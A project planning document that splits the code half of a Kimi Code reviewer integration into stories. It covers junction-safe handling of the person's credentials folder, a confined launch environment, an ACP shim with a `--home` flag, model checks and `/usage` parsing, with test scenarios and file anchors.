# PLAN — S4's code half, split into stories: a Kimi Code reviewer row over ACP

> Status: **stories written 2026-10-14, nothing implemented yet.** Two cornerstones (E4.1, E4.2) are marked
> `model: fable`: their scenarios and briefs are still to be written by Fable before any coder starts them.
>
> Parent plan: [PLAN_vibe_and_kimi_runtimes.md](PLAN_vibe_and_kimi_runtimes.md) — §4 **S4**, its code half (the
> measurement half is done: [RESULTS_kimi_confinement.md](../research/RESULTS_kimi_confinement.md) §1–§26). Decisions
> cited here by number (D6, D8b, D10, D14, D15, D16, D18, D19, D20) are the parent's; this document never restates them,
> it says who builds what, in which order, and how it is proved.

## 0. How to read this

**The epic.** S4's code half: a Kimi row added from the preset reviews plans and code through `coai-mcp --ask-acp`,
on a coai-owned `KIMI_CODE_HOME` whose `credentials` is a junction to the person's own folder (D19), in a built
environment, with the model checked twice (D10), writes refused by the shim (D15), and every deleter safe around the
junction. Not this epic: Kimi as a consultant and as a question row (S5), M-K14 (the refresh race — later, by the
owner's decision), and the Unix process-group teardown of the shim (parent §4 S4, the "before the shim launches Kimi on
any host but Windows" bullet: it belongs to the change that lifts D18 for Kimi, and D18 refuses every non-Windows host
here).

**Who does what** ([subagent-models.md](../.agents/conventions/common/subagent-models.md)). Per story: scenarios + brief —
Opus, or **Fable on a cornerstone**; code + tests — Sonnet; review — Opus; fixes — Sonnet. A coder starts a story only
when its SCENARIOS and BRIEF sections are written; E4.1 and E4.2 say "to be written by Fable" until Fable writes them.

**Cornerstones: 2 of 2** (Q = ⌈2·5/5⌉ = 2) — E4.1 (junction-safe ownership) and E4.2 (`KimiHome` + `KimiLaunch`):
the credentials junction and the owned home are security judgement — a bug in E4.1 deletes the person's sign-in, a bug
in E4.2 hands Kimi the person's configuration or a path out of its home. The ledger line is in the parent's §4 S4 block.

**The build order is the order below**, and it is strict for E4.1 → E4.2 → E4.3 → E4.4; E4.5 needs only E4.4's
runtime name to exist on the server (it can be written beside E4.4, never merged before it).

**Precondition for every story — S3 (#811) lands first.** `feat/kimi-runtime` is rebased on `main`, and `main` does not
have S3 yet. PR #811 (`feat/vibe-consultant`) already ships, and this epic BUILDS ON, never re-writes:
the link-safe deleter (`GitScratch.DeleteEvenIfReadOnly` unlinks a link by its own name and never enters it, clears
read-only FOLDERS too — commits `feb61bf6`, `92ff01b4`), its red-first test `DeletingAnOwnedTreeNeverEntersALinkTests`
(already a junction to a read-only file, three shapes), `OwnedPaths.IsLinkIfThere`, `ConsultantHomes` (`coai-vibe` AND
`coai-kimi`), D20's `ConsultantHomeSweep` (which already walks `coai-kimi/`), `ConversationFolder`'s held turn lock,
`TempDir.Dispose` through the product deleter, and the `vh-*` read-only-folder sweep test in `TempDirsAreSwept`.
**Rebase `feat/kimi-runtime` onto `main` after #811 merges, before E4.1 starts.** If #811 is not merged when E4.1 is due,
the story waits and the operator is told — copying those commits here would be the second copy the reuse rule forbids.
Every `file:line` below is verified on `main` 43a5637f (2026-10-14) unless it says `(S3)`, which means
`origin/feat/vibe-consultant` 6fdf0e09.

**Commands, for every story** (run from the worktree root; never `dotnet test`):

```bash
dotnet build dew_flow_connect_other_ais.slnx -c Debug -m:4
./src_mcp/tests/bin/Debug/net10.0/CoaiMcp.Tests.exe --filter-class "*<TheClass>"      # the story's classes first
./src_mcp/tests/bin/Debug/net10.0/CoaiMcp.Tests.exe                                    # then the whole suite
dotnet format dew_flow_connect_other_ais.slnx --verify-no-changes
cd src_vs_code && npm run typecheck && npm run lint && npm test                        # E4.4 (seeds) and E4.5
node src_vs_code/scripts/generate-feature-availability.mjs --check                     # E4.4 and E4.5
node .agents/conventions/tools/plan-lifecycle.mjs                                      # every story that edits a doc
```

**For every story:** cyclomatic complexity ≤ 4 per method; red first for every behaviour, with the red message written
into the summary; anything a test creates outside its process — a temp folder, a worktree, a branch — is named
`testsToDelete-<what>-<short id>` ([test-leftovers.md](../.agents/conventions/common/test-leftovers.md)), so new
tests use `TempDir.For("testsToDelete-<what>-")`, never a `coai-` product prefix (the existing
`DeletingAnOwnedTreeNeverEntersALinkTests` uses `coai-answers-…`, a prefix `shared/temp-sweep.json` marks `neverSwept`;
leave it, write new ones correctly). **No test ever makes a junction to anything outside its own `testsToDelete-` folder**
— never to the developer's real `~/.kimi-code`: a leftover folder is swept by `Remove-Item -Recurse`, and Windows
PowerShell 5.1's recursive remove walks INTO a junction. A fake person's home is a folder inside the test's own temp
folder, always. Each story adds its CHANGELOG lines under `## Unreleased` and updates the docs it names.

## E4.1 — Junction-safe ownership: making, reading back and disposing of a link into the person's folder

`model: fable` — **cornerstone** (security judgement: the first bug here deletes a person's sign-in).

**Goal.** coai can make a directory junction from an owned home to the person's `credentials` folder, read it back and
refuse a wrong target, and dispose of an owned home junction-first with verification — and every deleter that can ever
meet a `kh-*` home (or a conversation's `coai-kimi/<id>`) never enters the link. Nothing Kimi-specific beyond the shape:
no `kimi`, no config, no launch.

**Files and anchors (verified).**
- `src_mcp/runners/Files/GitScratch.cs:19-31` on `main`; the link-safe version is `GitScratch.cs:27-101` (S3). Do not
  re-implement — E4.1 starts after #811 (§0).
- `src_mcp/runners/Snapshots/SnapshotLinks.cs:37-48` (`IsLink`, fails closed) and `src_mcp/runners/Files/OwnedPaths.cs:18-36`
  (S3, `IsLinkIfThere` — a path not there is no link).
- `src_mcp/tests/DirectoryLink.cs:22-46` — the TEST helper that makes a junction with `cmd /c mklink /J` (relative `cmd`)
  and removes it non-recursively. The product needs its own primitive; the helper may later delegate to it.
- `src_mcp/runners/Worktrees/WorktreePaths.cs:64-82` — the repository's existing `LinkTarget` / `ResolveLinkTarget` read.
- `src_mcp/runners/Files/HeldFile.cs:41-55` — not for this story, named so the primitive does not invent a lock.
- Every deleter that can meet an owned home, each through `GitScratch.DeleteEvenIfReadOnly`: `RoundScratch.cs:75`
  (`src_mcp/src/Server/Rounds/`, the round's scratch — where a reviewer's `kh-*` home lives, `RosterBuilder.cs:451`
  passes it as `OwnedScratch`), `ReviewSnapshot.cs:186-197` (`TryDeleteRoot`), `ReviewSnapshots.cs:326`,
  `PanelService.cs:1342` / `:1376-1389` / `:1416` (the six-hour sweep `PruneOldScratchDirs`), `ConsultCheckScratch.cs:113`,
  `VibeRuntime.cs:118`, `VibeLaunch.cs:286`; and D20's `ConsultantHomeSweep.cs:157-186` (S3, `Removed` → `DeleteAllBut`
  → the deleter).
- The TEST sweeps: `src_mcp/tests/TempDirsAreSwept.cs` (its sweep is `PanelService.PruneOldScratchDirs`; its own fixture
  roots end in raw `Directory.Delete(root, recursive: true)` at `:132`, `:152`, `:173`) and the extension runner's
  `src_vs_code/scripts/sweepTemp.mjs:64-71` (`rmSync(target, { recursive: true, force: true })`), called from
  `src_vs_code/scripts/run-tests.mjs:102-110`.
- The probe's measured shapes, to port and not to re-guess: `scripts/lib/kimi-home.mjs:107-126` (`disposeOwnedHome`:
  the link removed by its own name, verified gone, the target's names compared with the names read before, only then
  the rest — "throws, and deletes nothing more, the moment a check fails") and `scripts/lib/kimi.mjs` `junction()`
  (the probe's `mklink /J`, plan D19 "Making the junction").

**Boundaries — what Fable's brief must decide and pin.**
- The junction maker: `FSCTL_SET_REPARSE_POINT` by P/Invoke (AOT-safe, no shell, no quoting of a profile path) or
  `cmd.exe` by its ABSOLUTE `System32` path with `/d /c mklink /J` (the probe's form) — D19 allows either; choose one and
  say why. Windows only (D18 refuses every other host for Kimi; on Unix the shape is a symlink, unmeasured — the
  primitive refuses there with the D18 sentence rather than guessing).
- The refusals BEFORE making it (D19 "Making the junction"): the target exists, is not itself a link (`SnapshotLinks.IsLink`
  — never chained), is a local path (a junction cannot point at UNC; a roaming profile is refused with the sentence);
  the link's own path does not exist yet.
- The read-back AFTER making it: the link IS a reparse point and its target, normalised, equals the person's folder —
  else the half-made link is removed by its own name and the caller gets a refusal.
- The verified disposal: which names are recorded before (names and count of the target's entries), what "intact" means
  after, and what happens when it is not (the probe: stop, delete nothing more, say it). Also the two shapes D19's §5
  test names: a home whose junction was already removed, and a TAMPERED home whose `credentials` is a real folder (S3's
  deleter test already deletes that whole; the verified disposal must not mistake it for the person's folder).
- Where the verified disposal is CALLED: the round's scratch (`RoundScratch.cs:75` deletes the whole folder, and a
  reviewer's `kh-*` home is inside it — dispose the homes first, or rely on the link-safe deleter and verify after?);
  D20's sweep (S3) for `coai-kimi/<id>`; S5's question row later. Decide, and say which callers stay on the bare
  link-safe deleter and why that is enough.
- The test sweeps: `sweepTemp.mjs`'s `rmSync` — does Node's recursive `rm` enter a junction on Windows? Prove it with a
  test either way (the probe's note that "a recursive remove followed a junction on a throwaway" is about a different
  call); `TempDirsAreSwept` — a `coai-answers-*` holding `kh-x/home/credentials` as a junction to a read-only file in the
  test's own folder, swept by `PruneOldScratchDirs`: junction gone, target file's bytes and read-only attribute intact.
- D19's red-first junction test of parent §5 ("after every deleter … the junction is gone, the tree is gone, the target
  folder still exists and its file keeps its bytes AND its read-only attribute") — S3 already has it for
  `GitScratch` itself; the brief names which deleters still need their own case.

**SCENARIOS — to be written by Fable.**

**BRIEF — to be written by Fable.**

**Docs.** `research/module_runners.md` (the files unit: the junction primitive and the verified disposal),
`research/module_tests.md` (the junction tests, and the rule that no test junctions outside its own folder).

## E4.2 — `KimiHome` + `KimiLaunch`: the owned home, its config, its validation, the built environment, one launch control

`model: fable` — **cornerstone** (security judgement: what of the person's reaches Kimi, and through which path).

**Goal.** Every Kimi launch is checked and built by ONE control, `KimiLaunch` — the Vibe shapes (`VibeLaunch`,
`VibeHome`, `VibeHomeTurns`) with the inversions D19 names: the owned home (`home/` = the `credentials` junction from
E4.1 + ONE coai-written `config.toml`) beside an empty `os/`; the person's OAuth slot READ from their `config.toml`,
never copied; the model block from the person's own `[models."<id>"]` or a pinned `shared/kimi-model-blocks.json`;
validation before every launch; the built environment (`ProcessEnvironment.Minimal`'s names + `KIMI_CODE_HOME` +
`KIMI_CODE_NO_AUTO_UPDATE=1` + `USERPROFILE`/`HOME`/`HOMEDRIVE`/`HOMEPATH` → `os/` + `PATH` beginning with the person's
`~/.kimi-code/bin`); the model pre-check against the curated `kimi-code/*` list (D10); `kimi --version` in the built
environment against `KimiAcpProfile.MeasuredVersions` — warn and run (owner, 2026-10-13); serialisation of the home's
turn and, across processes, per credentials target. No `KimiRuntime` yet (E4.4) and no shim change (E4.3): E4.2 is the
library both of them call.

**Files and anchors (verified).**
- The shapes repeated: `src_mcp/runners/Vibe/VibeLaunch.cs` — `HostRefusal` `:67-72`, `EnvironmentRefusal` `:91-94`,
  `Built` `:101-111`, `ModelRefusal` `:125-129`, `TakeAsync` `:143-168` (the order: before the turn — host, environment,
  model, home made; inside the turn — the shape, the version, the shape again, the verdict), `VersionAsync` `:233-248`,
  `Unmeasured` `:269-273`; `VibeHome.cs:36-62` (`Refusal` / `Checked`: the walk that never follows a link);
  `VibeHomeTurns.cs:21-41` (`TakeAsync`; vendor-free — D19 says shared, not copied: generalise it, e.g. `OwnedHomeTurns`,
  and keep `VibeHomeTurns` as the name callers use or move them; S3 adds `TryTake` to it, `VibeHomeTurns.cs` (S3));
  `VibeRuntime.cs:149-150` (`HomeFor`, the `vh-` + 10-hex shape → `kh-`).
- `src_mcp/runners/Reviewers/LaunchTurn.cs:17-56` — `Holding(held, warning)`; the warning today is a STRING built by
  `VibeLaunch.Unmeasured` alone. D19 asks for ONE version-warning shape for both runtimes from ONE builder: extract it
  here (a shared builder taking the runtime, the running version, the measured versions, what the numbers cover and the
  advised re-run) and make `VibeLaunch.Unmeasured` call it, so Vibe's sentence and Kimi's come from one place.
- `src_mcp/runners/Processes/ProcessEnvironment.cs:81-88` (`MinimalWindows` — it already NAMES `USERPROFILE`,
  `HOMEDRIVE`, `HOMEPATH`, `PATH`; the values change, the names do not), `:94` (`Minimal`).
- `src_mcp/runners/Reviewers/CodexConfigFile.cs:30-62` — reads ROOT keys only (`RootValue` stops at the first `[`).
  D19: "the TOML reading `CodexConfigFile.cs` already does … is widened, never duplicated" — the person's
  `[providers."managed:kimi-code"]` (`type`, `base_url`) and `[providers."managed:kimi-code".oauth]` (`storage`, `key`,
  `oauth_host`) and `[models."<id>"]` (`provider`, `model`, `max_context_size`, `capabilities` — an ARRAY) are TABLE
  values. The probe's reader is `scripts/lib/kimi-home.mjs:29-41` (`personsOauth`), its writer `:49-60`
  (`minimalConfigToml` — the exact bytes that answered 3 of 3, RESULTS §17 rung 3).
- `src_mcp/runners/Acp/KimiAcpProfile.cs` — `Exclusions` `:34` (E4.3 extends it), `InstalledExecutableFor` `:93-98`
  (`%USERPROFILE%\.kimi-code\bin\kimi.exe`); `MeasuredVersions` does not exist yet — D19 puts it here (`["2.1.1"]`).
- `src_mcp/runners/Vibe/VibeHomeManifest.cs:30-35` — how a `shared/*.json` seed is embedded; the model-block table
  follows it (D19: "embedded as the Vibe manifest is").
- `src_mcp/runners/Files/HeldFile.cs:41-55`, `:87-100` — the repository's ONE cross-process lock primitive (an exclusive
  open, released by the kernel on a crash). See the boundary on the cross-process gate below.
- The probe's measured shapes: `scripts/lib/kimi-home.mjs:177-185` (`builtEnv`: the four OS-home values from one folder,
  `HOMEDRIVE`/`HOMEPATH` split from it), `research/RESULTS_kimi_confinement.md` §17 (the ladder), §18 (the data names
  admitted by NAME, no manifest), §19 (the redirect), §20 (the pin), §22 (one answered turn per curated id), §24.

**Boundaries — what Fable's brief must decide and pin.**
- **The seam E4.3 and E4.4 call**, fixed here so neither re-designs it: `KimiLaunch.Built(ProcessRequest request,
  KimiPlaces places)` (or an equivalent single builder) and `KimiLaunch.EnvironmentRefusal(ProcessRequest request)`,
  `KimiLaunch.TakeAsync(HostKind, ProcessRequest, IProcessLauncher, CancellationToken) → LaunchTurn`, `KimiModels.Curated`
  / `KimiModels.Default`, and how `--home <path>` alone lets the shim rebuild the same environment. **A trap to close
  here:** the shim's OWN process may run in the built environment (D19: "the one builder … the runtime also uses for the
  shim's own request"), where `USERPROFILE` points into `os/` — so nothing that locates the PERSON's folders
  (`~/.kimi-code`, its `bin/`, its `credentials/`, `KimiAcpProfile.InstalledExecutable` at `:71-76`, which reads
  `SpecialFolder.UserProfile`) may be derived again inside a redirected process. The person's paths are resolved ONCE,
  in the unredirected parent, and travel explicitly (flags, or the request) — decide which.
- **The person's home**: `KIMI_CODE_HOME` of coai's own environment when set, else `~/.kimi-code` (D19); `bin/` is the
  INSTALL folder's (`KIMI_INSTALL_DIR`, default `~/.kimi-code` — Moonshot's `install.ps1`, read 2026-10-14).
- **Ripgrep — a finding of this split that the parent plan does not have.** D19 says the person's `~/.kimi-code/bin`
  holds `rg.exe`/`fd.exe` "where Kimi's installer puts" them. Moonshot's installer does NOT (both `install.ps1` and
  `install.sh`, `https://cdn.kimi.com/kimi-code/install.{ps1,sh}`, read 2026-10-14: they download `kimi` only); the
  `rg.exe` measured there (§17, §24) was put there by Kimi ITSELF — its documented ripgrep download into
  `$KIMI_CODE_HOME/bin` — on a run in the person's own home. So on a machine installed by E4.5's button whose person never
  ran Kimi's `Grep` at home, the built `PATH` finds no `rg`, the first review downloads ripgrep INTO THE OWNED HOME (the
  code write D19's validation refuses), and the launch after it is refused. Decide: a pre-launch check that `rg(.exe)`
  resolves on the built `PATH` (refused before any process, with a cure that does not depend on guessing Kimi's
  behaviour), or another answer — and record it as a deviation of D19.
- **The cross-process gate per credentials target.** D19 says "a named mutex". A `Mutex` is owned by a THREAD, and
  `TakeAsync` resumes on whatever thread the awaits leave it on, so a named mutex held across an `await` throws on
  release; and `HeldFile` is the repository's one cross-process primitive (its own remarks: "the one primitive every
  cross-process lock here rests on"). The judge's recommendation: a `HeldFile` lock at
  `<LocalApplicationData>/coai-kimi/locks/<sha256(target)[..16]>.lock`, taken by an async poll with jitter until the
  token fires — inside the row's timeout, as D19 states. Fable decides and records the deviation from "named mutex".
- **The scheduler's cap (`LaunchesOneAtATime`) is NOT this story's** — it moved to E4.4, where the adapter that
  declares it is registered and the scheduler can be tested through it; it is not security judgement.
- **The version gate**: today's released Kimi is **2.2.0** (`https://code.kimi.com/kimi-code/latest`, read 2026-10-14),
  the measured one 2.1.1, and the person's `tui.toml` has `[upgrade] auto_install = true` (RESULTS §3) — so the warning
  is expected on the owner's machine from the first launch. That is the owner's decision working, not a defect.
- **D18** — `HostRefusal` for Kimi (a Linux/WSL child or a non-Windows host), the Vibe sentence's shape.
- The validation list, the refusal sentences and their cures are D19's ("Validation before every launch"); the brief
  turns each into a scenario against a FAKE person's home inside the test's own folder.

**SCENARIOS — to be written by Fable.**

**BRIEF — to be written by Fable.**

**Docs.** `research/module_runners.md` (the Kimi unit beside the Vibe one: the home, the config render, the validation,
the environment, the gates, the shared version warning), `shared/kimi-model-blocks.json` documented where the Vibe
manifest is, the parent plan's D19 deviations (the gate, ripgrep) recorded in its §4 S4 block when the story lands.

## E4.3 — The shim: `--home`, the agent's environment rebuilt, the model checked in the session, `/usage` parsed

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Goal.** `coai-mcp --ask-acp --profile kimi` starts `kimi acp` only in the environment `KimiLaunch` builds from
`--home` (never by inheritance, D19), refuses an asked model the session does not announce (exit 65 with the list,
D10), and after an answered turn asks `/usage` and reports `tokensIn`/`tokensOut` (D15, M-K2). The two names M-K9 (e)
added join both exclusion lists.

**Files and anchors (verified).**
- `src_mcp/src/Acp/AskAcpMode.cs` — exit codes `:37-43`; `RunAsync` `:58-77`; `TurnAsync` `:80-106` (builds
  `AcpAsk` at `:100`, the boundary at `:101`); `Refusal` `:109-110`; `Report` `:184-208`; `UsageObject` `:211-221`
  (always `tokensIn: 0, notCaptured: true`).
- `src_mcp/runners/Acp/AcpOutcome.cs:9` (`AcpAsk`), `:35-38` (`AcpUsage`), `:66-79` (`AcpOutcome`).
- `src_mcp/runners/Acp/AcpClient.cs:36-57` (`AskAsync` → `AcpTransport.Start(ask.Executable, profile.Arguments,
  ask.Cwd)`), `:63-99` (`TurnAsync`: `initialize` → `session/new` `:74` → `set_config_option` `:82` → `session/prompt`
  `:83` → `Stopped`), `:148-158` (`Stopped`).
- `src_mcp/runners/Acp/AcpTransport.cs:87-88` — `Start` builds `new ProcessRequest(executable, arguments, cwd)`, which
  INHERITS (`ProcessRequest.InheritsEnvironment` defaults to `true`, `ProcessLauncher.cs:100`).
- `src_mcp/runners/Acp/AcpSession.cs:80` (`Answer` — every `agent_message_chunk` of the session, concatenated),
  `:452-466` (`Update`, `usage_update`).
- `src_mcp/runners/Acp/AcpMessages.cs:62` (`NewSession`), `:64` (`SetConfigOption`); `session/new`'s result carries
  `configOptions: [{ id, options: [{ value, name }] }]` (the shape the probe read, `scripts/probe-kimi-confinement.mjs:527-528`).
- `src_mcp/runners/Acp/IAcpProfile.cs:13-34`; `src_mcp/runners/Acp/KimiAcpProfile.cs:34` (`Exclusions`).
- `src_mcp/runners/Snapshots/SnapshotOptions.cs:59` (`SnapshotExclusions.Default`) and its remarks `:45-55` (an entry
  with a separator is a PATH suffix, one without is a NAME at any depth).
- `src_mcp/src/Program.cs:336` (the mode), `:430` (the call), `:2441-2442` (the help text); `.agents/PROJECT.md:51-68`
  (the one-shot modes list, and "never exits 64").
- Test harness: `src_mcp/tests/FakeAcpAgent.cs:147-162` (`FakeAcpProfile`), `src_mcp/tests_fakecli/AcpAgent.cs:90-94`
  (`session/new` answers `configOptions: []`), `:96-97` / `:113-124` (`set_config_option`), `:99-100` / `:127-152`
  (`session/prompt` runs the script's steps ONCE, whatever the prompt text); existing classes `AskAcpModeTests`,
  `AskAcpShimScenarioTests`, `AcpClientTests`, `AcpReadBoundaryTests`, `KimiAcpProfileTests`.

**BRIEF.**
1. **The fake agent learns three things** (`tests_fakecli/AcpAgent.cs`), each from a script field so existing scripts
   keep their behaviour: `models` — the `model` option's values announced by `session/new` (absent → announce `["m-1"]`,
   the default `FakeAcpAgent.Ask` already sends, so no existing test changes); `usageReply` — the text of the chunk the
   agent answers a `session/prompt` whose text is exactly `/usage` with (absent → that prompt runs the normal script,
   as today); `envFile` — on start, the agent writes its whole environment (`NAME=value` lines, sorted) to that path.
   `FakeAcpAgent` gets the matching helpers and a `Profile(…, environment: …)` overload (next step).
2. **The agent's request comes from the profile.** `AcpTransport.Start` takes a `ProcessRequest` (not exe/args/cwd);
   `IAcpProfile` gains `ProcessRequest AgentRequest(string executable, string cwd, string home)` with a DEFAULT body
   returning today's inherited request (so `FakeAcpProfile` and any test profile keep working) and `bool NeedsAHome =>
   false`. `KimiAcpProfile` overrides both: `NeedsAHome => true`, and `AgentRequest` = `KimiLaunch.Built(new
   ProcessRequest(executable, Arguments, cwd), …)` — the E4.2 seam, exactly as E4.2's brief pins it (the person's paths
   NOT re-derived inside this process — see E4.2's boundary). `AcpAsk` gains `Home`. `AcpClient.AskAsync` builds the
   request through the profile, then asks `KimiLaunch.EnvironmentRefusal` through a profile member (`string
   AgentRefusal(ProcessRequest request) => string.Empty` by default; Kimi's calls `KimiLaunch.EnvironmentRefusal`) and
   returns `NotStarted` with that sentence when it is not empty — the agent never starts.
3. **`--home`.** `AskAcpMode.Refusal` gains `HomeRefusal(profile, home)`: a profile that `NeedsAHome` without
   `--home`, or with a folder that does not exist → 65 with `--ask-acp needs --home <the coai-owned KIMI_CODE_HOME>`.
   An agent-environment refusal from step 2 is ALSO 65 (a request this shim will not make), and the report is printed
   (`end: not_started`). Update the 65 line of the type's remarks and `Program.cs:2441` with `--home <folder>`.
4. **The model, checked in the session** (D10 (2)). In `AcpClient.TurnAsync`, after `session/new`, read the announced
   `model` option values (a pure `AcpMessages.AnnouncedValues(JsonElement sessionResult, string optionId)` →
   `IReadOnlyList<string>`). If the profile's `ModelOptionId` is not announced at all, or the asked model is not among its
   values, end WITHOUT sending `set_config_option`: a new `AcpEnd.ModelNotOffered` (word `model_not_offered`), reason
   `the agent's session offers <a, b, c> for 'model'; '<asked>' is not one of them`, exit **65** (the request named a
   value the agent will not take — 65 is "a request this shim will not make", never 64, never 70). Keep `TurnAsync` at
   CC ≤ 4: extract `ConfigureAsync(session, sessionId, sessionResult, ask)`.
5. **`/usage` after `end_turn`** (D15, M-K2: answered by Kimi in ~2 s, no model call). Only when `stop == end_turn`:
   record the answer's length (`session.Answer.Length`), send `session/prompt` with the text `/usage` on the SAME
   session, bounded by its own short deadline (a constant, 15 s, linked to the turn's token — never longer than what is
   left of the turn), then split: the answer is `Answer[..mark]`, the `/usage` reply is `Answer[mark..]`. Parse the
   reply with a pure `AcpUsageLine.Parse(string text) → (long In, long Out, bool Captured)`: the regex
   `Session total:\s*([\d,]+)\s+input,\s*([\d,]+)\s+output` (digits with optional thousands commas, culture-invariant);
   anything else (`Session total: no LLM calls yet`, no line, a timeout, an agent error on the second prompt) →
   `Captured = false`. The second prompt can NEVER change the turn's end, answer or exit: any exception from it is caught
   and leaves usage not captured. `AcpOutcome` gains `TokensIn`, `TokensOut`, `TokensCaptured`; `UsageObject` writes them
   (`notCaptured` = `!TokensCaptured`, tokens 0 when not captured — never a guessed number); `contextUsed`/`contextSize`
   stay as today. A turn that did not end `end_turn` sends nothing more (the agent's log shows ONE `session/prompt`).
6. **Exclusions** (M-K9 (e), §21). `KimiAcpProfile.Exclusions` (`:34`) and `SnapshotExclusions.Default`
   (`SnapshotOptions.cs:59`) both gain `".agents/agents"` (a PATH suffix, like `.agents/skills`) and `".mcp.json"` (a
   NAME — the parent says "project-root `.mcp.json`"; matching it at every depth is the stricter reading and what a name
   entry does; keep it, and say so in the remarks). Update both remarks to cite §21.
7. **Docs**: `research/module_runners.md` (the shim: `--home`, the rebuilt environment, the in-session model check, the
   `/usage` usage), `.agents/PROJECT.md` (the `--ask-acp` line: `--home`; 65 now also covers a model the session does not
   offer and an agent environment that is not coai's), CHANGELOG.

**SCENARIOS** (each one a test; red first — the expected red is what today's code does).

| # | Given | When | Then | Expected red today |
|---|---|---|---|---|
| S3.1 `ATurnWithoutAHome_IsRefused65` (`AskAcpModeTests`) | the `kimi` profile, `--cwd` an existing folder, a model, no `--home` | `AskAcpMode.RunAsync` | exit 65; the note names `--home`; no process started | exit 69 (`not_started`: `kimi` not found) or 0 — the flag is unknown, nothing checks it |
| S3.2 `TheAgentGetsTheBuiltEnvironment_NotTheParents` (`AskAcpShimScenarioTests`) | a fake agent with `envFile`; a profile whose `AgentRequest` is `KimiLaunch.Built` on a fake person's home in the test's own folder; the PARENT environment carries `KIMI_CODE_HOME=<elsewhere>`, `USERPROFILE=<real>` and `VIBE_MCP_SERVERS=x` | the shim runs one turn with `--home <owned>/home` | the agent's environment holds only `Minimal`'s names plus `KIMI_CODE_HOME` (= the owned home) and `KIMI_CODE_NO_AUTO_UPDATE=1`; `USERPROFILE`, `HOME`, `HOMEDRIVE`+`HOMEPATH` point into the owned `os/`; `PATH`'s first entry is the fake person's `bin`; neither `VIBE_MCP_SERVERS` nor the parent's `KIMI_CODE_HOME` is there | the agent's file shows the parent's `KIMI_CODE_HOME` and `VIBE_MCP_SERVERS` (inherited, `AcpTransport.cs:87-88`) |
| S3.3 `AnAgentEnvironmentThatIsNotCoais_IsRefusedBeforeStart` | a profile whose `AgentRefusal` answers a sentence (e.g. `--home` whose `os/` is missing, per E4.2's refusal) | one turn | exit 65, `end: not_started`, the sentence on stderr; the fake agent's log file does not exist | the agent starts |
| S3.4 `AModelTheSessionDoesNotOffer_Exits65WithTheList` | a fake agent announcing `models: ["kimi-code/k3-256k","kimi-code/k3"]` | `--model kimi-code/kimi-for-coding` | exit 65; stderr names both announced values and the asked one; the agent's log has NO `session/set_config_option` and NO `session/prompt`; report `end: model_not_offered` | exit 0 — `set_config_option` sent, the fake replies `{}`, the prompt answered |
| S3.5 `AnOfferedModel_IsSetAndAsked` | the same agent | `--model kimi-code/k3` | `set_config_option` sent with `kimi-code/k3` before the prompt; exit 0 | (green today for the order; keeps the happy path pinned) |
| S3.6 `ASessionThatOffersNoModelOption_Exits65` | a fake agent announcing `configOptions: []` explicitly (`models: []`) | any model | exit 65, "offers no 'model' option" | exit 0 |
| S3.7 `AfterAnAnswer_UsageIsTheSessionTotal` | a fake agent: chunk `OK`, `end_turn`; `usageReply`: `Context: 20004 / 262144 tokens (8%) Session total: 19973 input, 31 output` | one turn | report `usage.tokensIn = 19973`, `tokensOut = 31`, `notCaptured = false`; `answer` is exactly `OK` (no `Session total` in it); the agent's log shows two `session/prompt`, the second's text `/usage` | `tokensIn 0`, `notCaptured true` |
| S3.8 `AnUnparseableUsageReply_IsNotCaptured_NeverZeroAsANumber` | `usageReply`: `Context: 0 / 262144 tokens (0%) Session total: no LLM calls yet` | one turn | `notCaptured = true`, `tokensIn = 0`, `tokensOut = 0`, exit 0, answer intact | (green for tokens today — pins that a parse failure stays unknown once S3.7 is in) |
| S3.9 `AUsagePromptThatFails_LeavesTheAnswerAlone` | an agent that answers the `/usage` prompt with a JSON-RPC error (a `promptErrorOnUsage` field) — and a second case where it hangs past the 15 s bound | one turn | exit 0, `end: answered`, the answer kept, `notCaptured = true`; the hang case returns within the bound plus the teardown grace | the error turns the answered turn into `agent_failed`, exit 70 (once S3.7's call exists without its guard) |
| S3.10 `NoUsageIsAskedAfterANonAnswer` | an agent ending `stopReason: max_tokens` | one turn | exactly ONE `session/prompt` in the log; `notCaptured = true`; exit 70 | two prompts (once S3.7 exists without its guard) |
| S3.11 `TheBoundaryRefusesTheTwoNewNames` (`AcpReadBoundaryTests`) | a snapshot root holding `.agents/agents/x.md`, `sub/.agents/agents/y.md` and `.mcp.json` | `fs/read_text_file` for each | each refused as an excluded name, not quoted | served |
| S3.12 `TheSnapshotLeavesOutTheTwoNewNames` (`ReviewSnapshotTests`) | a tree with `.agents/agents/x.md`, `.agents/PROJECT.md`, `.mcp.json`, `sub/.mcp.json` | a snapshot is made | the first, third and fourth absent and listed as excluded in the manifest; `.agents/PROJECT.md` present | all present |
| S3.13 `AcpUsageLineTests` (pure) | `19,973 input, 31 output`; `Session total: 7 input, 0 output`; a line with only `input`; empty | `Parse` | (19973, 31, true); (7, 0, true); not captured; not captured | (class does not exist) |

**Done when** every scenario is green, the whole C# suite is green, `dotnet format --verify-no-changes` is clean, the
shim's `--help` text and `.agents/PROJECT.md` name `--home`, and no exit path returns 64.

## E4.4 — `KimiRuntime`: registered, classified from its report, serialised in the round, diagnosed, seeded

`model: opus` spec (this document) · Sonnet codes · Opus reviews.

**Goal.** A Kimi row on the server: the adapter that builds the shim's request (E4.3) through the launch control
(E4.2), reads the answer and usage from the shim's REPORT, classifies a failure from the report's structured fields and
never by scanning text, runs one Kimi launch of a round at a time, says Kimi's failures in coai's words, probes its
version without touching the person's home, and appears in the seeds. After this story a Kimi row reviews.

**Files and anchors (verified).**
- `src_mcp/runners/Reviewers/ReviewerRuntime.cs` — `IReviewerRuntime` `:318`; `ProbeVersionAsync` `:359-360`;
  `VersionWarning` `:367`; `NeedsASanitisedSnapshot` `:404`; `TakeTurnAsync` `:419-420`; `ReviewerRuntimeSelector.Default`
  `:835-836`; `RuntimeNames` `:851-855`; `MachineOnlyRuntimes` `:870-871`; `Named` `:882-896` (the `vibe` arm `:889`).
- The model to follow: `src_mcp/runners/Vibe/VibeRuntime.cs` (whole file: `Build` `:75-92`, `ProbeVersionAsync`
  `:99-111`, `HomeFor` `:149-150`, `TakeTurnAsync` `:182-183`, `VersionWarning` `:193-196`); the self-invocation shape:
  `src_mcp/runners/Reviewers/ApiRuntime.cs:75-77` (`LocalRuntime.SelfInvocation()` and the prefix) and its report reader
  `:160-182` (`ReadUsage` reads ROOT-level `tokensIn` — the ACP report nests them under `usage`, `AskAcpMode.cs:193`, so
  the reader is Kimi's own, not a reuse of `ApiRuntime.ReadUsage`); `LocalAsk.ShimDeadlineSeconds` (used by `ApiRuntime`).
